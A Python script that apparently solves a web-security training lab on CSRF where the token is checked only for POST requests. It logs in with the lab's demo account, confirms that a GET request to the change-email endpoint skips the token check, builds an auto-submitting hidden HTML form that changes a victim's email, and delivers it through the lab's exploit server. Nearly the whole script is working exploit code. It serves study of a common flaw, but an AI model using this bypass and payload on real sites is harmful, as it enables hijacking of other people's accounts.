# Lab: CSRF where token validation depends on request method
# Idea: the server checks the csrf token ONLY for POST.
#       The same change-email action also works with GET, and GET skips the check.
#       -> send the request as GET without csrf from a page on another site.
# Note: requests does not run JS. Python checks the bypass with my own session,
#       then uploads the HTML to the exploit server and presses "Deliver".

import requests

base = "https://0a5a004e034283498091f47000a500dc.web-security-academy.net"
exploit = "https://exploit-0ab1000e03ac8320803ff3c201000028.exploit-server.net"
NEW_EMAIL = "victim999@test.com"   # must be an email NOT used by any account yet

s = requests.Session()

print("===========[step1] login with provided Credential===============")
r = s.get(f"{base}/login")   # this lab's login form may also carry a csrf token
login_data = {"username": "wiener", "password": "peter"}
if 'name="csrf"' in r.text:
    login_data["csrf"] = r.text.split('name="csrf" value="')[1].split('"')[0]
r = s.post(f"{base}/login", data=login_data)
print("status:", r.status_code)

print("===========[step2] POST without csrf -> should be blocked===============")
r = s.post(f"{base}/my-account/change-email", data={"email": "test1@test.com"}, allow_redirects=False)
print("status:", r.status_code, r.text)   # 400 "Missing parameter 'csrf'"

print("===========[step3] GET without csrf -> token check skipped?===============")
# GET puts the value in the URL (?email=...) -> params=, not data=
r = s.get(f"{base}/my-account/change-email", params={"email": "test2@test.com"}, allow_redirects=False)
print("status:", r.status_code)   # 302 = changed without token -> vulnerable

print("===========[step4] Build CSRF HTML (form method GET)===============")
body = f"""<form method="GET" action="{base}/my-account/change-email">
    <input type="hidden" name="email" value="{NEW_EMAIL}">
</form>
<script>
document.forms[0].submit();
</script>"""
print(body)

print("===========[step5] Store + Deliver exploit to victim===============")
form = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "responseBody": body,
}
r = requests.post(exploit + "/", data={**form, "formAction": "STORE"})
print("store status:", r.status_code)
r = requests.post(exploit + "/", data={**form, "formAction": "DELIVER_TO_VICTIM"})
print("deliver status:", r.status_code)

print("===========[step6] Check lab status===============")
r = requests.get(base)
print("solved?:", "is-solved" in r.text)
